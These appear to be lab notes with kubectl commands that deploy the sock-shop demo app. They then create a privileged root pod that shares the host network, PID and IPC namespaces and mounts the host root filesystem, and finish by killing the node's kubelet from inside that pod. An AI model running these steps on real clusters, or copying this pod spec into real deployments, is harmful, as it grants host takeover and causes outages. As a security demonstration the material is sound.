# Deploy sock-shop
```
kubectl create namespace sock-shop
kubectl apply -n sock-shop -f https://raw.githubusercontent.com/microservices-demo/microservices-demo/master/deploy/kubernetes/complete-demo.yaml
```

# Get the frontend service
```
kubectl get svc -n sock-shop front-end
```

# Port forward to access locally
kubectl port-forward -n sock-shop svc/front-end 8080:80

# Create insecure-pod

```
kubectl run insecure-pod \
  --image=alpine \
  --overrides='
  {
    "apiVersion": "v1",
    "spec": {
      "hostNetwork": true,
      "hostPID": true,
      "hostIPC": true,
      "containers": [{
        "name": "insecure",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "while true; do sleep 3600; done"],
        "securityContext": {
          "privileged": true,
          "allowPrivilegeEscalation": true,
          "runAsUser": 0
        },
        "volumeMounts": [{
          "mountPath": "/host",
          "name": "host-root"
        }]
      }],
      "volumes": [{
        "name": "host-root",
        "hostPath": {
          "path": "/",
          "type": "Directory"
        }
      }]
    }
  }' --restart=Never
```

# View host process

ps aux

# Kill

```
kubectl exec -it insecure-pod -- sh
killall kubelet
```
